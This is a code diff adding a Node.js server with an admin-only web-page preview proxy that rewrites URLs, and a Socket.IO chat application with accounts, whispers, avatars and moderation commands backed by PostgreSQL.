+}
+
+function getPreviewSession(key) {
+  const session = previewSessions.get(key);
+  if (!session) return null;
+  if (Date.now() > session.expiresAt) {
+    previewSessions.delete(key);
+    return null;
+  }
+  return session;
+}
+
+function requirePreviewKey(req, res, next) {
+  const key = String(req.query.key || '');
+  const session = getPreviewSession(key);
+  if (!session) return res.status(403).json({ error: 'Preview session expired. Reload the tester.' });
+  req.previewKey = key;
+  req.previewSession = session;
+  next();
+}
+
+function enterRenderRequest(session) {
+  const now = Date.now();
+  if (now - session.windowStartedAt >= RENDER_RATE_WINDOW_MS) {
+    session.windowStartedAt = now;
+    session.windowCount = 0;
+  }
+  if (session.windowCount >= RENDER_RATE_LIMIT) {
+    const retryAfter = Math.max(1, Math.ceil((RENDER_RATE_WINDOW_MS - (now - session.windowStartedAt)) / 1000));
+    const error = Object.assign(new Error('Too many preview requests. Please wait a moment.'), { statusCode: 429, retryAfter });
+    throw error;
+  }
+  if (session.active >= RENDER_MAX_CONCURRENT) {
+    throw Object.assign(new Error('Too many resources are loading at once.'), { statusCode: 429, retryAfter: 2 });
+  }
+  session.windowCount += 1;
+  session.active += 1;
+}
+
+function leaveRenderRequest(session) {
+  session.active = Math.max(0, session.active - 1);
+}
+
+function shouldProxyUrl(value) {
+  const v = String(value || '').trim();
+  if (!v || v.startsWith('#')) return false;
+  return !/^(?:data:|blob:|javascript:|mailto:|tel:|about:)/i.test(v);
+}
+
+function htmlEscapeAttribute(value) {
+  return String(value)
+    .replace(/&/g, '&amp;')
+    .replace(/"/g, '&quot;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+function cssEscapeUrl(value) {
+  return String(value).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+}
+
+function makeProxyUrl(target, key, proxyOrigin) {
+  return `${proxyOrigin}/api/render?key=${encodeURIComponent(key)}&url=${encodeURIComponent(target)}`;
+}
+
+function absoluteAndProxy(value, baseUrl, key, proxyOrigin) {
+  if (!shouldProxyUrl(value)) return value;
+  try {
+    const absolute = new URL(String(value).trim(), baseUrl).href;
+    if (absolute.startsWith(proxyOrigin + '/api/render')) return absolute;
+    return makeProxyUrl(absolute, key, proxyOrigin);
+  } catch {
+    return value;
+  }
+}
+
+function rewriteSrcset(value, baseUrl, key, proxyOrigin) {
+  return String(value).split(',').map(part => {
+    const bits = part.trim().split(/\s+/);
+    if (!bits[0]) return part;
+    bits[0] = absoluteAndProxy(bits[0], baseUrl, key, proxyOrigin);
+    return bits.join(' ');
+  }).join(', ');
+}
+
+function rewriteCss(css, baseUrl, key, proxyOrigin) {
+  let out = String(css);
+  out = out.replace(/url\(\s*(['"]?)([^)'"\\]+|data:[^)]*?)\1\s*\)/gi, (full, quote, rawUrl) => {
+    const trimmed = String(rawUrl).trim();
+    if (!shouldProxyUrl(trimmed)) return full;
+    const proxied = absoluteAndProxy(trimmed, baseUrl, key, proxyOrigin);
+    return `url(${quote}${cssEscapeUrl(proxied)}${quote})`;
+  });
+  out = out.replace(/(@import\s+)(['"])([^'"]+)\2/gi, (full, prefix, quote, rawUrl) => {
+    if (!shouldProxyUrl(rawUrl)) return full;
+    const proxied = absoluteAndProxy(rawUrl, baseUrl, key, proxyOrigin);
+    return `${prefix}${quote}${cssEscapeUrl(proxied)}${quote}`;
+  });
+  return out;
+}
+
+function rewriteHtml(html, baseUrl, key, proxyOrigin) {
+  let out = String(html);
+
+  // Remove upstream browser policies that refer to the original origin.
+  out = out.replace(/<meta[^>]+http-equiv=["']?content-security-policy[^>]*>/gi, '');
+  out = out.replace(/<base\b[^>]*>/gi, '');
+
+  const attrPattern = /\b(src|href|action|poster|data)\s*=\s*(["'])(.*?)\2/gi;
+  out = out.replace(attrPattern, (full, name, quote, value) => {
+    if (!shouldProxyUrl(value)) return full;
+    const proxied = absoluteAndProxy(value, baseUrl, key, proxyOrigin);
+    return `${name}=${quote}${htmlEscapeAttribute(proxied)}${quote}`;
+  });
+
+  out = out.replace(/\b(srcset)\s*=\s*(["'])(.*?)\2/gi, (full, name, quote, value) =>
+    `${name}=${quote}${htmlEscapeAttribute(rewriteSrcset(value, baseUrl, key, proxyOrigin))}${quote}`
+  );
+
+  out = out.replace(/\bstyle\s*=\s*(["'])(.*?)\1/gi, (full, quote, value) =>
+    `style=${quote}${htmlEscapeAttribute(rewriteCss(value, baseUrl, key, proxyOrigin))}${quote}`
+  );
+
+  out = out.replace(/(<style\b[^>]*>)([\s\S]*?)(<\/style>)/gi, (full, open, css, close) =>
+    `${open}${rewriteCss(css, baseUrl, key, proxyOrigin)}${close}`
+  );
+
+  // SRI hashes can fail when CSS is rewritten, so remove integrity/crossorigin
+  // from resource tags whose content or URL may be transformed.
+  out = out.replace(/\s+(?:integrity|crossorigin)\s*=\s*(["']).*?\1/gi, '');
+
+  out = out.replace(/(<meta\b[^>]+http-equiv=["']?refresh["']?[^>]*content=["'][^"]*url\s*=\s*)([^"']+)/gi, (full, prefix, value) =>
+    prefix + absoluteAndProxy(value.trim(), baseUrl, key, proxyOrigin)
+  );
+
+  const baseTag = `<base href="${htmlEscapeAttribute(baseUrl)}">`;
+  const runtime = `<script>(function(){
+    const K=${JSON.stringify(key).replace(/</g,'\\u003c')};
+    const O=${JSON.stringify(proxyOrigin).replace(/</g,'\\u003c')};
+    const P=O+'/api/render?key='+encodeURIComponent(K)+'&url=';
+    const wrap=v=>{try{const s=String(v??'').trim();if(!s||/^(?:data:|blob:|javascript:|mailto:|tel:|about:|#)/i.test(s))return v;const u=new URL(s,document.baseURI);if(!/^https?:$/i.test(u.protocol)||u.href.startsWith(P))return v;return P+encodeURIComponent(u.href)}catch{return v}};
+    const of=window.fetch;if(of)window.fetch=function(input,init){try{if(typeof input==='string'||input instanceof URL)return of.call(this,wrap(input),init);if(input&&input.url){const r=new Request(wrap(input.url),input);return of.call(this,r,init)}}catch{}return of.apply(this,arguments)};
+    const xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(method,url){arguments[1]=wrap(url);return xo.apply(this,arguments)};
+    const wo=window.open;if(wo)window.open=function(url,target,features){return wo.call(this,wrap(url),target,features)};
+  })();</script>`;
+
+  if (/<head\b[^>]*>/i.test(out)) {
+    out = out.replace(/<head\b[^>]*>/i, m => `${m}${baseTag}${runtime}`);
+  } else {
+    out = baseTag + runtime + out;
+  }
+  return out;
+}
+
+async function responseBodyLimited(response, limit) {
+  const chunks = [];
+  let total = 0;
+  for await (const chunk of response.body) {
+    total += chunk.length;
+    if (total > limit) throw Object.assign(new Error('Upstream response is too large.'), { statusCode: 413 });
+    chunks.push(chunk);
+  }
+  return Buffer.concat(chunks);
+}
+
+function storeUpstreamCookies(session, url, response) {
+  const getSetCookie = response.headers.getSetCookie;
+  if (typeof getSetCookie !== 'function') return;
+  const cookies = getSetCookie.call(response.headers);
+  if (!cookies.length) return;
+  const origin = new URL(url).origin;
+  const jar = session.cookies.get(origin) || new Map();
+  for (const line of cookies) {
+    const pair = String(line).split(';', 1)[0].trim();
+    const eq = pair.indexOf('=');
+    if (eq <= 0) continue;
+    const name = pair.slice(0, eq).trim();
+    const value = pair.slice(eq + 1).trim();
+    if (!value) jar.delete(name);
+    else jar.set(name, value);
+  }
+  session.cookies.set(origin, jar);
+}
+
+function cookieHeaderFor(session, url) {
+  const jar = session.cookies.get(new URL(url).origin);
+  if (!jar) return '';
+  return [...jar.entries()].map(([name, value]) => `${name}=${value}`).join('; ');
+}
+
+function proxyOriginFor(req) {
+  const host = req.get('host');
+  const proto = req.get('x-forwarded-proto') || req.protocol || 'https';
+  return `${proto.split(',')[0].trim()}://${host}`;
+}
+
+function upstreamHeaders(req, cookieHeader, targetUrl) {
+  const target = new URL(targetUrl);
+  const headers = {
+    'user-agent': req.get('user-agent') || 'Mozilla/5.0',
+    'accept': req.get('accept') || '*/*',
+    'accept-language': req.get('accept-language') || 'en-US,en;q=0.8'
+  };
+  const contentType = req.get('content-type');
+  if (contentType) headers['content-type'] = contentType;
+  if (cookieHeader) headers.cookie = cookieHeader;
+
+  // Preserve same-site navigation context without forwarding the proxy's own origin.
+  const referer = req.get('referer');
+  if (referer) {
+    try {
+      const ref = new URL(referer);
+      if (ref.origin === proxyOriginFor(req)) headers.referer = target.origin + '/';
+    } catch {}
+  }
+  return headers;
+}
+
+async function fetchThroughProxy(req, targetUrl, session) {
+  let current = new URL(targetUrl);
+  let method = String(req.method || 'GET').toUpperCase();
+  let body = !['GET', 'HEAD'].includes(method) && Buffer.isBuffer(req.body) ? req.body : undefined;
+  let response;
+
+  for (let hop = 0; hop <= 8; hop++) {
+    await assertPublicUrl(current);
+    const headers = upstreamHeaders(req, cookieHeaderFor(session, current.href), current.href);
+    response = await fetch(current, {
+      method,
+      body,
+      redirect: 'manual',
+      signal: AbortSignal.timeout(15000),
+      headers
+    });
+    storeUpstreamCookies(session, current.href, response);
+
+    const loc = response.headers.get('location');
+    if (response.status >= 300 && response.status < 400 && loc) {
+      if (hop === 8) throw Object.assign(new Error('Too many redirects.'), { statusCode: 502 });
+      const next = new URL(loc, current);
+      if ([301, 302, 303].includes(response.status) && !['GET', 'HEAD'].includes(method)) {
+        method = 'GET';
+        body = undefined;
+      }
+      current = next;
+      continue;
+    }
+    break;
+  }
+  return { response, finalUrl: current.href };
+}
+
+app.get('/api/preview-key', requireAdminHttp, (req, res) => {
+  const key = createPreviewSession(req.username);
+  res.set('Cache-Control', 'no-store');
+  res.set('X-Robots-Tag', 'noindex, nofollow, noarchive');
+  res.json({ key, expiresInMs: PREVIEW_SESSION_TTL_MS });
+});
+
+app.all('/api/render', requirePreviewKey, express.raw({ type: '*/*', limit: '5mb' }), async (req, res) => {
+  const session = req.previewSession;
+  let requestEntered = false;
+  try {
+    enterRenderRequest(session);
+    requestEntered = true;
+
+    let target;
+    try { target = new URL(String(req.query.url || '')); }
+    catch { return res.status(400).json({ error: 'Invalid URL.' }); }
+
+    const started = Date.now();
+    const { response, finalUrl } = await fetchThroughProxy(req, target.href, session);
+    const type = response.headers.get('content-type') || 'application/octet-stream';
+    let body = await responseBodyLimited(response, RENDER_MAX_BYTES);
+    const proxyOrigin = proxyOriginFor(req);
+
+    if (/text\/html|application\/xhtml\+xml/i.test(type)) {
+      body = Buffer.from(rewriteHtml(body.toString('utf-8'), finalUrl, req.previewKey, proxyOrigin), 'utf-8');
+      res.set('Content-Type', 'text/html; charset=utf-8');
+      res.set('Cache-Control', 'no-store');
+    } else if (/text\/css/i.test(type)) {
+      body = Buffer.from(rewriteCss(body.toString('utf-8'), finalUrl, req.previewKey, proxyOrigin), 'utf-8');
+      res.set('Content-Type', 'text/css; charset=utf-8');
+      res.set('Cache-Control', 'no-store');
+    } else {
+      res.set('Content-Type', type);
+    }
+
+    res.set('X-Content-Type-Options', 'nosniff');
+    res.set('X-Robots-Tag', 'noindex, nofollow, noarchive');
+    res.status(response.status).send(body);
+
+    const safeTarget = (() => { try { const u = new URL(finalUrl); return `${u.origin}${u.pathname}`; } catch { return 'invalid'; } })();
+    console.log(`[render] user=${session.username} target=${safeTarget} status=${response.status} bytes=${body.length} ms=${Date.now()-started}`);
+  } catch (error) {
+    const status = Number(error?.statusCode) || (error?.name === 'TimeoutError' ? 504 : 502);
+    if (error?.retryAfter) res.set('Retry-After', String(error.retryAfter));
+    console.warn(`[render] user=${session.username} status=${status} error=${error?.message || 'unknown'}`);
+    res.status(status).json({ error: error?.message || 'Unable to fetch that resource.' });
+  } finally {
+    if (requestEntered) leaveRenderRequest(session);
+  }
+});
+
+app.use(express.static(path.join(__dirname, 'public')));
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public/index.html')));
+app.get('/chat.html', (req, res) => res.sendFile(path.join(__dirname, 'public/chat.html')));
+app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public/admin.html')));
+
+const cleanText = (value, max) => typeof value === 'string' ? value.trim().slice(0, max) : '';
+const normalizeUsername = value => cleanText(value, MAX_USERNAME_LENGTH);
+const validUsername = username => /^[A-Za-z0-9_-]{3,24}$/.test(username);
+const validColor = color => typeof color === 'string' && /^#[0-9a-fA-F]{6}$/.test(color);
+function validAvatar(url) {
+  if (!url) return true;
+  try { return ['http:', 'https:'].includes(new URL(url).protocol) && url.length <= MAX_AVATAR_URL_LENGTH; }
+  catch { return false; }
+}
+const isAdmin = username => ADMIN_USERS.has(username);
+
+async function getUser(username) {
+  const result = await db.query('SELECT username, password_hash, status, muted_until, avatar, color FROM users WHERE username=$1 LIMIT 1', [username]);
+  return result.rows[0] || null;
+}
+async function userExists(username) {
+  const result = await db.query('SELECT 1 FROM users WHERE username=$1 LIMIT 1', [username]);
+  return result.rowCount > 0;
+}
+async function userIsBanned(username) {
+  const result = await db.query('SELECT 1 FROM banned_users WHERE username=$1 LIMIT 1', [username]);
+  return result.rowCount > 0;
+}
+async function countUsers() {
+  const result = await db.query('SELECT COUNT(*)::int AS count FROM users');
+  return result.rows[0].count;
+}
+async function requireAuth(socket) {
+  try {
+    const token = socket.handshake.auth?.token;
+    const username = token ? sessions.get(token) : null;
+    if (!username || !(await userExists(username)) || (await userIsBanned(username))) {
+      socket.emit('authRequired');
+      return null;
+    }
+    return username;
+  } catch {
+    socket.emit('errorMessage', 'Authentication service is temporarily unavailable.');
+    return null;
+  }
+}
+function addAudit(entry) {
+  auditLogs.push({ ...entry, time: Date.now() });
+  if (auditLogs.length > 500) auditLogs.shift();
+}
+async function publicUser(username) {
+  const user = await getUser(username);
+  return { username, status: user?.status || '', mutedUntil: user?.muted_until ? new Date(user.muted_until).getTime() : null, avatar: user?.avatar || '', color: user?.color || '#ffffff', isAdmin: isAdmin(username) };
+}
+async function updateUsers() {
+  const list = [];
+  for (const username of [...new Set(onlineUsers.values())]) list.push(await publicUser(username));
+  io.emit('updateUsers', list);
+}
+function disconnectUser(username, event, reason) {
+  for (const [socketId, user] of onlineUsers.entries()) {
+    if (user !== username) continue;
+    io.to(socketId).emit(event, reason);
+    io.sockets.sockets.get(socketId)?.disconnect(true);
+  }
+}
+async function initializeDatabase() {
+  await db.query(`
+    CREATE TABLE IF NOT EXISTS users (
+      id BIGSERIAL PRIMARY KEY,
+      username VARCHAR(24) NOT NULL UNIQUE,
+      password_hash TEXT NOT NULL,
+      status VARCHAR(80) NOT NULL DEFAULT '',
+      muted_until TIMESTAMPTZ NULL,
+      avatar TEXT NOT NULL DEFAULT '',
+      color CHAR(7) NOT NULL DEFAULT '#ffffff',
+      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    );
+    CREATE TABLE IF NOT EXISTS banned_users (
+      username VARCHAR(24) PRIMARY KEY REFERENCES users(username) ON DELETE CASCADE,
+      banned_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    );
+    CREATE INDEX IF NOT EXISTS users_username_lower_idx ON users (LOWER(username));
+  `);
+}
+
+io.on('connection', socket => {
+  socket.on('register', async (payload = {}) => {
+    const username = normalizeUsername(payload.username);
+    const password = typeof payload.password === 'string' ? payload.password : '';
+    if (!validUsername(username)) return socket.emit('registerError', 'Username must be 3–24 characters and use only letters, numbers, _ or -.');
+    if (password.length < 6 || password.length > 128) return socket.emit('registerError', 'Password must be between 6 and 128 characters.');
+    try {
+      if ((await countUsers()) >= MAX_USERS) return socket.emit('registerError', 'The server is full.');
+      if (await userExists(username)) return socket.emit('registerError', 'Username already exists.');
+      if (await userIsBanned(username)) return socket.emit('registerError', 'That username is unavailable.');
+      const passwordHash = await bcrypt.hash(password, 12);
+      await db.query('INSERT INTO users (username, password_hash) VALUES ($1,$2)', [username, passwordHash]);
+      addAudit({ action: 'register', user: username });
+      socket.emit('registerSuccess');
+    } catch (error) {
+      if (error.code === '23505') return socket.emit('registerError', 'Username already exists.');
+      console.error('Registration error:', error);
+      socket.emit('registerError', 'Registration failed. Please try again.');
+    }
+  });
+
+  socket.on('login', async (payload = {}) => {
+    const username = normalizeUsername(payload.username);
+    const password = typeof payload.password === 'string' ? payload.password : '';
+    try {
+      if (await userIsBanned(username)) return socket.emit('loginError', 'You are banned from this chat.');
+      const user = await getUser(username);
+      if (!user) return socket.emit('loginError', 'User not found.');
+      if (!await bcrypt.compare(password, user.password_hash)) return socket.emit('loginError', 'Incorrect password.');
+      const token = crypto.randomBytes(32).toString('hex');
+      sessions.set(token, username);
+      socket.handshake.auth.token = token;
+      onlineUsers.set(socket.id, username);
+      socket.emit('loginSuccess', { token, username, isAdmin: isAdmin(username) });
+      socket.emit('messages', messages);
+      await updateUsers();
+      addAudit({ action: 'login', user: username });
+    } catch (error) {
+      console.error('Login error:', error);
+      socket.emit('loginError', 'Login failed. Please try again.');
+    }
+  });
+
+  socket.on('authenticate', async () => {
+    const username = await requireAuth(socket);
+    if (!username) return;
+    onlineUsers.set(socket.id, username);
+    socket.emit('authenticated', { username, isAdmin: isAdmin(username) });
+    socket.emit('messages', messages);
+    await updateUsers();
+  });
+
+  socket.on('chat', async payload => {
+    const username = await requireAuth(socket);
+    if (!username) return;
+    try {
+      const user = await getUser(username);
+      const message = cleanText(payload, MAX_MESSAGE_LENGTH);
+      const now = Date.now();
+      if (!user || !message) return;
+      const mutedUntil = user.muted_until ? new Date(user.muted_until).getTime() : null;
+      if (mutedUntil && now < mutedUntil) return socket.emit('errorMessage', 'You are currently muted.');
+      if (socket.data.lastMessageAt && now - socket.data.lastMessageAt < MESSAGE_COOLDOWN_MS) return;
+      socket.data.lastMessageAt = now;
+      const messageObj = { id: crypto.randomUUID(), user: username, message, time: now, edited: false, color: user.color || '#ffffff', avatar: user.avatar || '' };
+      messages.push(messageObj);
+      if (messages.length > 1000) messages.shift();
+      io.emit('chat', messageObj);
+    } catch { socket.emit('errorMessage', 'Unable to send message right now.'); }
+  });
+
+  socket.on('whisper', async (payload = {}) => {
+    const username = await requireAuth(socket);
+    if (!username) return;
+    try {
+      const target = normalizeUsername(payload.target);
+      const message = cleanText(payload.message, MAX_MESSAGE_LENGTH);
+      if (!target || !message || !(await userExists(target)) || await userIsBanned(target)) return socket.emit('errorMessage', 'User not found or message is empty.');
+      const whisper = { id: crypto.randomUUID(), from: username, to: target, message, time: Date.now() };
+      whispers.push(whisper);
+      if (whispers.length > 1000) whispers.shift();
+      for (const [socketId, user] of onlineUsers.entries()) if (user === target || user === username) io.to(socketId).emit('whisper', whisper);
+    } catch { socket.emit('errorMessage', 'Unable to send whisper right now.'); }
+  });
+
+  socket.on('editMessage', async payload => {
+    const username = await requireAuth(socket);
+    if (!username) return;
+    const id = typeof payload.id === 'string' ? payload.id : '';
+    const newText = cleanText(payload.newText, MAX_MESSAGE_LENGTH);
+    const msg = messages.find(m => m.id === id);
+    if (!msg || !newText || (msg.user !== username && !isAdmin(username))) return;
+    msg.message = newText;
+    msg.edited = true;
+    io.emit('editMessage', msg);
+  });
+
+  socket.on('deleteMessage', async payload => {
+    const username = await requireAuth(socket);
+    if (!username) return;
+    const id = typeof payload.id === 'string' ? payload.id : '';
+    const msg = messages.find(m => m.id === id);
+    if (!msg || (msg.user !== username && !isAdmin(username))) return;
+    messages = messages.filter(m => m.id !== id);
+    io.emit('deleteMessage', { id });
+  });
+
+  socket.on('setStatus', async status => {
+    const username = await requireAuth(socket);
+    if (!username) return;
+    await db.query('UPDATE users SET status=$1 WHERE username=$2', [cleanText(status, MAX_STATUS_LENGTH), username]);
+    await updateUsers();
+  });
+  socket.on('typing', async isTyping => { const username = await requireAuth(socket); if (username) socket.broadcast.emit('typing', { user: username, isTyping: Boolean(isTyping) }); });
+  socket.on('setAvatar', async url => {
+    const username = await requireAuth(socket);
+    if (!username) return;
+    const avatar = cleanText(url, MAX_AVATAR_URL_LENGTH);
+    if (!validAvatar(avatar)) return socket.emit('errorMessage', 'Avatar must be a valid HTTP(S) URL.');
+    await db.query('UPDATE users SET avatar=$1 WHERE username=$2', [avatar, username]);
+    await updateUsers();
+  });
+  socket.on('setColor', async color => {
+    const username = await requireAuth(socket);
+    if (!username) return;
+    if (!validColor(color)) return socket.emit('errorMessage', 'Invalid chat color.');
+    await db.query('UPDATE users SET color=$1 WHERE username=$2', [color, username]);
+    await updateUsers();
+  });
+  socket.on('reportAvatar', async (payload = {}) => {
+    const username = await requireAuth(socket);
+    if (!username) return;
+    const target = normalizeUsername(payload.target);
+    if (!target || !(await userExists(target)) || target === username) return;
+    avatarReports.push({ reporter: username, target, time: Date.now() });
+    if (avatarReports.length > 500) avatarReports.shift();
+    addAudit({ action: 'avatar_report', user: username, target });
+    if (isAdmin(username)) io.emit('updateReports', avatarReports);
+  });
+
+  socket.on('requestAdminData', async () => {
+    const username = await requireAuth(socket);
+    if (!username || !isAdmin(username)) return socket.emit('adminError', 'Admin access required.');
+    socket.emit('adminData', { reports: avatarReports, auditLogs });
+  });
+
+  socket.on('adminCommand', async (payload = {}) => {
+    const username = await requireAuth(socket);
+    if (!username || !isAdmin(username)) return socket.emit('adminError', 'Admin access required.');
+    const cmd = cleanText(payload.cmd, 20).toLowerCase();
+    const target = normalizeUsername(payload.target);
+    const arg = cleanText(payload.arg, 200);
+    if (target && isAdmin(target) && ['kick', 'ban', 'mute'].includes(cmd)) return socket.emit('adminError', 'You cannot moderate another admin.');
+    try {
+      if (cmd === 'kick') {
+        if (!(await userExists(target))) return socket.emit('adminError', 'User not found.');
+        disconnectUser(target, 'kicked', arg || 'Kicked by admin');
+        addAudit({ action: 'kick', admin: username, target, reason: arg });
+      } else if (cmd === 'ban') {
+        if (!(await userExists(target))) return socket.emit('adminError', 'User not found.');
+        await db.query('INSERT INTO banned_users (username) VALUES ($1) ON CONFLICT (username) DO NOTHING', [target]);
+        disconnectUser(target, 'banned', arg || 'Banned by admin');
+        addAudit({ action: 'ban', admin: username, target, reason: arg });
+      } else if (cmd === 'mute') {
+        if (!(await userExists(target))) return socket.emit('adminError', 'User not found.');
+        const seconds = Math.min(Math.max(Number.parseInt(arg, 10) || 60, 1), 86400);
+        const mutedUntil = new Date(Date.now() + seconds * 1000);
+        await db.query('UPDATE users SET muted_until=$1 WHERE username=$2', [mutedUntil, target]);
+        for (const [socketId, user] of onlineUsers.entries()) if (user === target) io.to(socketId).emit('mutedStatus', { mutedUntil: mutedUntil.getTime() });
+        addAudit({ action: 'mute', admin: username, target, until: mutedUntil.getTime() });
+      } else if (cmd === 'clear') {
+        messages = [];
+        io.emit('messages', messages);
+        addAudit({ action: 'clear', admin: username });
+      } else if (cmd === 'unban') {
+        await db.query('DELETE FROM banned_users WHERE username=$1', [target]);
+        addAudit({ action: 'unban', admin: username, target });
+      } else return socket.emit('adminError', 'Unknown command.');
+      socket.emit('adminData', { reports: avatarReports, auditLogs });
+      await updateUsers();
+    } catch (error) {
+      console.error('Admin command error:', error);
+      socket.emit('adminError', 'Admin command failed.');
+    }
+  });
+
+  socket.on('disconnect', () => { onlineUsers.delete(socket.id); updateUsers().catch(() => {}); });
+});
+
+async function start() {
+  try {
+    await db.query('SELECT 1');
+    await initializeDatabase();
+    server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+  } catch (error) {
+    console.error('Database startup failed:', error.message);
+    await db.end().catch(() => {});
+    process.exit(1);
+  }
+}
+process.on('SIGTERM', async () => { await db.end().catch(() => {}); server.close(() => process.exit(0)); });
+process.on('SIGINT', async () => { await db.end().catch(() => {}); server.close(() => process.exit(0)); });
+start();
